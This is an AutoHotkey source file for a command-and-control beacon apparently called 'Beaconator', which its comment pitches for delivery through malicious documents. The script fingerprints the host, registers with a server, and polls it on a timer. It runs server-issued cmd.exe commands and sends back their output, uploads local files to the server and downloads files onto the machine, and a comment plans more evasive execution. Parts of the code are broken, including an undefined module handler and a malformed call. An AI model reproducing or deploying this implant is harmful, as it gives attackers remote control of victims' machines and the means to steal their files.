#Requires AutoHotkey v2.0
#SingleInstance Force

; Simple AHK script for more lightweight delivery, such as in maldoc scenarios.
; Only use Beaconator for legal and ethical testing purposes.  

class NetworkClient {
    AF_INET := 2
    SOCK_STREAM := 1
    IPPROTO_TCP := 6
    SOCKET_ERROR := -1
    WSAEWOULDBLOCK := 10035
    WSAECONNREFUSED := 10061
    WSAETIMEDOUT := 10060
    
    socket := 0
    wsaInitialized := false
    serverIP := "127.0.0.1"
    serverPort := 5074
    agentID := ""
    computerName := ""

    checkInInterval := 15000  ; 15 seconds default
    isRunning := false
    lastAction := ""
    isBusy := false

    loggerIH := ""
    loggerisRunning := false
    
    __New(serverIP := "127.0.0.1", serverPort := 5074) {
        this.serverIP := serverIP
        this.serverPort := serverPort
        this.Initialize()
        this.computerName := A_ComputerName
        this.agentID := this.GenerateAgentID()
       
    }

    Log(msg, logFile := "logfile.txt") {
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        logMessage := timestamp " NetworkClient: " msg "`n"
        
        try {
            FileAppend(logMessage, "*")
        } catch Error as err {
            FileAppend(logMessage, logFile)
        }
    }
    
    GenerateAgentID() {
        ; Generate a unique ID based on computer name and other hardware info
        systemInfo := this.GetSystemInfo()
        systemInfo .= A_ScriptFullPath
        return this.HashString(systemInfo)
    }
    
    GetSystemInfo() {
        ; Collect system information for unique ID generation
        info := A_ComputerName
        info .= A_UserName
        info .= A_OSVersion
        info .= this.GetMACAddress()
        return info
    }
    
    GetMACAddress() {
        ; Simple MAC address retrieval
        try {
            objWMIService := ComObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\CIMV2")
            colItems := objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
            for objItem in colItems {
                return objItem.MACAddress
            }
        }
        return ""
    }
    
    HashString(str) {
        ; Simple hashing function
        hash := 0
        loop parse str {
            hash := ((hash << 5) - hash) + Ord(A_LoopField)
            hash := hash & 0xFFFFFFFF
        }
        return Format("{:08x}", hash)
    }
    
    Initialize() {
        if (!this.wsaInitialized) {
            wsaData := Buffer(408)
            result := DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)
            if (result != 0) {
                throw Error("WSAStartup failed with error: " DllCall("Ws2_32\WSAGetLastError"))
            }
            this.wsaInitialized := true
        }
    }
    
    SendMsg(serverIP, port, message, timeout := 60000, isBinaryResponse := false) {
        maxRetries := 5
        retryCount := 0
        startTime := A_TickCount
        
        while (A_TickCount - startTime < timeout) {
            try {
                ; Create socket
                this.socket := DllCall("Ws2_32\socket", 
                    "Int", this.AF_INET, 
                    "Int", this.SOCK_STREAM, 
                    "Int", this.IPPROTO_TCP)
                
                if (this.socket = -1) {
                    throw Error("Socket creation failed: " . DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Set socket options
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 5000, timeoutVal, 0)  ; 5 second timeout
                
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1006,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                ; Create sockaddr structure
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)
                
                ; Connect
                if (DllCall("Ws2_32\connect", 
                    "Ptr", this.socket, 
                    "Ptr", sockaddr, 
                    "Int", 16) = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    this.CloseSocket()
                    if (retryCount < maxRetries) {
                        this.Log("Could not connect to server, retrying in 1 second...")
                        Sleep(1000)
                        retryCount++
                        continue
                    }
                    throw Error("Connect failed: " . wsaError)
                }
                
                ; Send message
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                bytesSent := DllCall("Ws2_32\send",
                    "Ptr", this.socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)
                
                if (bytesSent = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    throw Error("Send failed: " . wsaError)
                }
                
                ; Receive response
                response := Buffer(4096, 0)
                totalReceived := 0
                
                while (true) {
                    bytesRecv := DllCall("Ws2_32\recv",
                        "Ptr", this.socket,
                        "Ptr", response.Ptr + totalReceived,
                        "Int", response.Size - totalReceived,
                        "Int", 0)
                    
                    if (bytesRecv > 0) {
                        this.Log("Received " . bytesRecv . " bytes")
                        totalReceived += bytesRecv
                        if (totalReceived + 4096 >= response.Size) {
                            ; Expand buffer
                            newSize := response.Size * 2
                            this.Log("Expanding buffer to " . newSize . " bytes")
                            try {
                                newBuffer := Buffer(newSize, 0)
                                DllCall("RtlCopyMemory",
                                    "Ptr", newBuffer,
                                    "Ptr", response,
                                    "UPtr", totalReceived)
                                response := newBuffer
                            } catch as err {
                                this.Log("Buffer expansion failed: " . err.Message)
                                throw err
                            }
                        }
                    } else if (bytesRecv = 0) {
                        this.Log("Server closed connection normally")
                        break
                    } else {
                        wsaError := DllCall("Ws2_32\WSAGetLastError")
                        if (wsaError = this.WSAEWOULDBLOCK) {
                            Sleep(10)
                            continue
                        }
                        throw Error("Receive failed: " . wsaError)
                    }
                }
                
                ; Return appropriate response format
                if (isBinaryResponse) {
                    if (totalReceived = 0) {
                        return Buffer(0)
                    }
                    finalBuffer := Buffer(totalReceived, 0)
                    DllCall("RtlCopyMemory",
                        "Ptr", finalBuffer,
                        "Ptr", response,
                        "UPtr", totalReceived)
                    return finalBuffer
                } else {
                    return StrGet(response, totalReceived, "UTF-8")
                }
                
            } catch as err {
                this.Log("SendMsg error: " . err.Message)
                throw err
            } finally {
                this.CloseSocket()
            }
        }
        throw Error("Operation timed out after " . timeout . "ms")
    }

    SetSocketOptions() {
        timeoutVal := Buffer(4, 0)
        NumPut("UInt", 10000, timeoutVal, 0)  ; 10 second timeout
        
        ; Set receive timeout
        DllCall("Ws2_32\setsockopt", 
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1005,
            "Ptr", timeoutVal,
            "Int", 4)
            
        ; Set send timeout
        DllCall("Ws2_32\setsockopt", 
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1006,
            "Ptr", timeoutVal,
            "Int", 4)
            
        ; Set keep-alive
        keepAlive := Buffer(4, 0)
        NumPut("UInt", 1, keepAlive, 0)
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x8,
            "Ptr", keepAlive,
            "Int", 4)
    }

    ConnectSocket(serverIP, port) {
        sockaddr := Buffer(16, 0)
        NumPut("UShort", this.AF_INET, sockaddr, 0)
        NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
        NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)
        
        return DllCall("Ws2_32\connect", 
            "Ptr", this.socket, 
            "Ptr", sockaddr, 
            "Int", 16) != -1
    }

    CloseSocket() {
        if (this.socket) {
            try {
                ; Try to send connection close notification
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 1)  ; SD_SEND
                
                ; Small receive buffer to get any pending data
                buffer := Buffer(128, 0)
                
                ; Brief timeout for final receive
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 100, timeoutVal, 0)  ; 100ms timeout
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                ; Try to receive any remaining data
                while (DllCall("Ws2_32\recv",
                    "Ptr", this.socket,
                    "Ptr", buffer,
                    "Int", 128,
                    "Int", 0) > 0) {
                    ; Continue receiving until done
                }
                
                ; Now do full shutdown
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 2)  ; SD_BOTH
            } catch {
                ; Ignore errors during cleanup
            }
            
            ; Always close the socket
            DllCall("Ws2_32\closesocket", "Ptr", this.socket)
            this.socket := 0
        }
    }

    __Delete() {
        this.CloseSocket()
        if (this.wsaInitialized) {
            DllCall("Ws2_32\WSACleanup")
            this.wsaInitialized := false
        }
    }

    Register() {
        this.Log("Attempting to register with server...")
        message := Format("register|{}|{}", this.agentID, this.computerName)
        
        try {
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (InStr(response, "Registration successful")) {
                this.Log("Registration successful")
                return true
            } else {
                this.Log("Registration failed: " response)
                return false
            }
        } catch as err {
            this.Log("Registration error: " err.Message " occurred on line: " err.Line)
            return false
        }
    }

    HandleFileDownload(filename) {
        this.Log("Handling file download: " filename)
        local file := "", verifyFile := ""
        
        try {
            ; Initial request 
            message := Format("to_beacon|{}", filename)
            this.Log("Sending file request: " message)
            
            ; Send the request and get file data
            response := this.SendMsg(this.serverIP, this.serverPort, message, 60000, true)
            
            ; Validate response
            if (!response || response.Size = 0) {
                throw Error("No data received from server")
            }
            
            ; Check for error response
            errorCheck := StrGet(response, 5, "UTF-8")
            if (errorCheck = "ERROR") {
                errorMsg := StrGet(response, response.Size, "UTF-8")
                throw Error("Server error: " errorMsg)
            }
            
            ; Write file
            try {
                ; Open file in binary write mode
                file := FileOpen(filename, "w-rwd")  ; Binary mode, write access
                if (!file) {
                    throw Error("Could not create file: " filename)
                }
                
                ; Write data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                totalWritten := 0
                
                while (totalWritten < response.Size) {
                    remaining := response.Size - totalWritten
                    writeSize := (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining
                    
                    ; Create chunk buffer
                    chunk := Buffer(writeSize, 0)
                    DllCall("RtlCopyMemory", 
                        "Ptr", chunk, 
                        "Ptr", response.Ptr + totalWritten, 
                        "UPtr", writeSize)
                    
                    ; Write chunk
                    written := file.RawWrite(chunk, writeSize)
                    if (written != writeSize) {
                        throw Error("Write failed: Wrote " . written . " of " . writeSize . " bytes")
                    }
                    
                    totalWritten += written
                    
                    ; Log progress
                    if (totalWritten >= 1048576) {
                        this.Log("Written " . Floor(totalWritten/1048576) . "MB")
                    }
                }
                
                file.Close()
                file := ""
                
                ; Verify file size
                verifyFile := FileOpen(filename, "r-r")  ; Read mode
                if (!verifyFile) {
                    throw Error("Could not verify file")
                }
                
                if (verifyFile.Length != response.Size) {
                    verifyFile.Close()
                    throw Error("File size mismatch: Expected " . response.Size . " got " . verifyFile.Length)
                }
                
                verifyFile.Close()
                verifyFile := ""
                
                ; Send single completion notification with shorter timeout
                try {
                    this.SendMsg(this.serverIP, this.serverPort,
                        Format("download_complete|{}|{}", this.agentID, filename),
                        1000)  ; Very short timeout since we don't care about response
                } catch as err {
                    ; If notification fails, log but don't fail the download
                    this.Log("Warning: Could not send completion notification: " err.Message)
                }
                
                this.Log("File download complete: " filename)
                return true
                
            } catch as err {
                if (file) {
                    file.Close()
                }
                if (verifyFile) {
                    verifyFile.Close()
                }
                throw Error("File write error: " . err.Message)
            }
            
        } catch as err {
            this.Log("File download error: " . err.Message)
            ; Send failure notification with shorter timeout
            try {
                this.SendMsg(this.serverIP, this.serverPort,
                    Format("download_failed|{}|{}", this.agentID, filename),
                    5000,  ; 5 second timeout for failure message
                    false)
            } catch {
                ; Ignore errors in failure notification
            }
            return false
        }
    }
    
    HandleFileUpload(filepath) {
        this.Log("Handling file upload: " filepath)
        
        try {
            if (!FileExist(filepath)) {
                this.Log("File not found error: " filepath)
                throw Error("File not found: " filepath)
            }
            
            SplitPath(filepath, &filename)
            
            ; First send the from_beacon command and wait for READY response
            message := Format("from_beacon|{}", filename)
            this.Log("Sending initial from_beacon command: " message)
            
            ; Create new socket for file transfer
            transfer_socket := DllCall("Ws2_32\socket", 
                "Int", this.AF_INET, 
                "Int", this.SOCK_STREAM, 
                "Int", this.IPPROTO_TCP)
                
            if (transfer_socket = -1) {
                this.Log("Failed to create transfer socket")
                throw Error("Socket creation failed")
            }
            
            try {
                ; Connect socket
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", this.serverPort), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", this.serverIP), sockaddr, 4)
                
                if (DllCall("Ws2_32\connect", 
                    "Ptr", transfer_socket, 
                    "Ptr", sockaddr, 
                    "Int", 16) = -1) {
                    throw Error("Connect failed: " DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Send initial command
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                
                this.Log("Sending command on transfer socket")
                DllCall("Ws2_32\send",
                    "Ptr", transfer_socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)
                
                ; Wait for READY
                this.Log("Waiting for READY response...")
                ready_buffer := Buffer(128, 0)
                ready_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Ptr", ready_buffer,
                    "Int", 128,
                    "Int", 0)
                    
                if (ready_received <= 0) {
                    throw Error("Failed to receive READY signal")
                }
                
                ready_response := StrGet(ready_buffer, ready_received, "UTF-8")
                this.Log("Received response: " ready_response)
                
                if (ready_response != "READY") {
                    throw Error("Unexpected response: " ready_response)
                }
                
                ; Now send the file
                this.Log("Starting file transfer")
                file := FileOpen(filepath, "r")
                if (!IsObject(file)) {
                    throw Error("Could not open file")
                }
                
                ; Send file data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                bytes_sent := 0
                
                while (!file.AtEOF) {
                    buff := Buffer(CHUNK_SIZE, 0)  ; Create buffer for this chunk
                    bytes_read := file.RawRead(buff, CHUNK_SIZE)
                    if (bytes_read = 0) {
                        break
                    }
                    
                    sent := DllCall("Ws2_32\send",
                        "Ptr", transfer_socket,
                        "Ptr", buff.Ptr,
                        "Int", bytes_read,  ; Use actual bytes read
                        "Int", 0)
                        
                    if (sent = -1) {
                        throw Error("Send failed: " DllCall("Ws2_32\WSAGetLastError"))
                    }
                    
                    bytes_sent += sent
                    this.Log("Sent " bytes_sent " bytes")
                }
                
                file.Close()
                this.Log("File transfer complete. Total bytes sent: " bytes_sent)
                
                ; Get final response
                this.Log("Waiting for SUCCESS response")
                final_buffer := Buffer(128, 0)
                final_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Int", 128,
                    "Int", 0)
                    
                if (final_received > 0) {
                    final_response := StrGet(final_buffer, final_received, "UTF-8")
                    this.Log("Final response: " final_response)
                    return final_response = "SUCCESS"
                }
                
                return true
                
            } finally {
                this.Log("Closing transfer socket")
                DllCall("Ws2_32\closesocket", "Ptr", transfer_socket)
            }
            
        } catch as err {
            this.Log("File upload error with details: " err.Message " " err.Line)
            return false
        }
    }

    CheckIn() {
        if (this.isBusy) {
            this.Log("Skipping check-in - client is busy")
            return true
        }
        
        this.isBusy := true
        try {
            this.Log("Checking in with server...")
            message := Format("request_action|{}", this.agentID)
            
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (!response) {
                return false
            }
            
            responseParts := StrSplit(response, "|")
            action := responseParts[1]
            this.lastAction := action
            
            result := false
            switch action {
                case "no_pending_commands":
                    this.Log("No pending commands")
                    result := true
                    
                case "download_file":
                    filename := responseParts[2]
                    result := this.HandleFileDownload(filename)
                    
                case "upload_file":
                    filepath := responseParts[2]
                    result := this.HandleFileUpload(filepath)
                    
                case "execute_command":
                    command := responseParts[2]
                    this.Log("CheckIn received execute_command: " command)
                    result := this.HandleCommand(command)

                case "execute_module":
                    module := responseParts[2]
                    if (responseParts.Length >= 3) {
                        parameters := responseParts[3]
                    } else{
                        parameters := ""
                    }

                    this.Log("CheckIn received execute_module " module "|" parameters)
                    result := this.ExecuteModule(module, parameters)
                    
                default:
                    this.Log("Unknown action received: " action)
                    result := false
            }
            
            return result
        } catch as err {
            this.Log("CheckIn error: " err.Message " " err.Line)
            return false
        } finally {
            this.isBusy := false
        }
    }

    StartCheckInLoop() {
        if (this.isRunning) {
            return
        }
        
        this.isRunning := true
        SetTimer(ObjBindMethod(this, "CheckIn"), this.checkInInterval)
    }

    StopCheckInLoop() {
        this.isRunning := false
        SetTimer(ObjBindMethod(this, "CheckIn"), 0)
    }
    
    HandleCommand(command) {

        if command = "shutdown"{
            ExitApp
        }

        this.Log("HandleCommand starting execution of: " command)
        try {
            ; TODO: expand execution ability with optional parameters
            ; and more evasive method
            shell := ComObject("WScript.Shell")
            exec := shell.Exec('%ComSpec% /c ' command)
            output := exec.StdOut.ReadAll()

            if (output){
                message := Format("command_output|{}|{}", this.agentID, output)
            } else {
                message := Format("command_output|{}|(Empty)", this.agentID)
            }
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return true
        } catch as err {
            this.Log("Command execution failed: " err.Message " occurred on line: " err.Line)
            message := Format("command_output|{}|Exeuction Failed: {}" this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    }

if A_Args.Length = 1 {
    client := NetworkClient(A_Args[1])
} 
else If A_Args.Length = 2{
    client := NetworkClient(A_Args[1], A_Args[2])
} 
else {
    client := NetworkClient("127.0.0.1", "5074")  ; NetworkClient("your_ip") Default is 127.0.0.1
}

if (client.Register()) {
    
    client.StartCheckInLoop()
    
    while client.isRunning {
        Sleep(100)
    }

} else {
    MsgBox "Registration failed!"
}
